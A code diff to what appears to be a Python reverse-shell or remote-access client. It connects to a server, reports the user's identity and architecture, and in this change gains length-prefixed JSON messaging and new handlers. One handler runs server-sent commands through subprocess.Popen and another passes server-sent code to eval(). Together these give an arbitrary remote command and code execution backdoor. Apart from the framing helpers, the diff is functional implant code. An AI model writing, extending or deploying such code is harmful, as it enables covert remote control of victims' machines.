@@ -18,6 +18,11 @@ except ImportError:
 HOST = 'localhost'
 PORT = 1708
 
+# Commands
+STDIN = "stdin"
+EVAL = "eval"
+CMD = "cmd"
+
 # Supporting classes
 
 class ByteLockBundler:
@@ -49,8 +54,9 @@ class ByteLockBundler:
         stdoutbuff, stderrbuff = self.getAndClear()
         if len(stdoutbuff) > 0 or len(stderrbuff) > 0:
             outputdict = dict(stdout=stdoutbuff.decode('UTF-8'),stderr=stderrbuff.decode('UTF-8'))
-            json_dict = json.dumps(outputdict)
-            self.sock.sendall(json_dict.encode('UTF-8'))
+            json_str = json.dumps(outputdict)
+            json_format = formatBytes(json_str)
+            self.sock.sendall(json_format)
 
 # Scripts
 
@@ -62,11 +68,13 @@ def main():
                 user, arch = getInfo()
 
                 infodict = dict(user=user, arch=arch)
-                json_dict = json.dumps(infodict)
+                json_str = json.dumps(infodict)
+                json_format = formatBytes(json_str)
 
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((HOST, PORT))
-                s.sendall(json_dict.encode('UTF-8'))
+                s.sendall(json_format)
+                print("[+] Sent")
                 serve(s)
             except Exception as e:
                 # TODO: Remove debug code
@@ -100,11 +108,18 @@ def serve(sock):
                 bytelock.writeStderr(out)
 
     def pollSock():
-        # TODO change to json for general formatting
-        for line in readSocket(sock):
-            line += "\n"
-            proc.stdin.write(line.encode('UTF-8'))
+        recvbytes = recvFormatBytes(sock)
+        recvjson = json.loads(recvbytes.decode('UTF-8'))
+
+        if STDIN in recvjson:
+            proc.stdin.write(recvjson[STDIN].encode('UTF-8'))
             proc.stdin.flush()
+        if CMD in recvjson:
+            cmd_str = recvjson[CMD]
+            cmd_arr = cmd_str.split(" ")
+            newproc = subprocess.Popen(cmd_arr)
+        if EVAL in recvjson:
+            eval(recvjson[EVAL])
 
     def writeBundles():
         while True:
@@ -127,24 +142,47 @@ def serve(sock):
     t_procerr.join()
     t_bndl.join()
 
+def formatBytes(msg):
+    '''
+    Takes str or bytes and produces bytes where the first 4 bytes
+    correspond to the message length
+    :param msg: input message
+    :return: <[length][message]>
+    '''
+    if type(msg) == str:
+        msg = str.encode(msg)
+    if type(msg) == bytes:
+        return (struct.pack('>i', len(msg)) + msg)
+    else:
+        raise Exception("msg must be of type bytes or str")
 
-def readSocket(sock, endchars='\n'):
-    # TODO change to <packetlength><packet> format instead of newline separated
-    buff = b""
-    while True:
-        packet = sock.recv(1024)
-        if len(packet) == 0:
-            raise Exception("Server closed socket")
-        buff += packet
-        try:
-            buffstr = buff.decode('UTF-8')
-            if endchars in buffstr:
-                line, buffstr = buffstr.split(endchars, 1)
-                buff = buffstr.encode('UTF-8')
-                yield line
-        except Exception as e:
-            print("Exception: " + str(e))
 
+def recvFormatBytes(recvable):
+    '''
+    Receives bytes from recvable, expects first 4 bytes to be length of message,
+    then receives that amount of data and returns raw bytes of message
+    :param recvable: Any object with recv(bytes) function
+    :return:
+    '''
+    total_len = 0
+    total_data = b''
+    size = sys.maxsize
+    size_data = b''
+    recv_size = 8192
+    while total_len < size:
+        sock_data = recvable.recv(recv_size)
+        if not total_data:
+            if len(sock_data) > 4:
+                size_data += sock_data
+                size = struct.unpack('>i', size_data[:4])[0]
+                recv_size = min(524288, size)
+                total_data += size_data[4:]
+            else:
+                size_data += sock_data
+        else:
+            total_data += sock_data
+        total_len = len(total_data)
+    return total_data
 
 def getInfo():
     proc = subprocess.Popen(["whoami"], stdout=subprocess.PIPE)
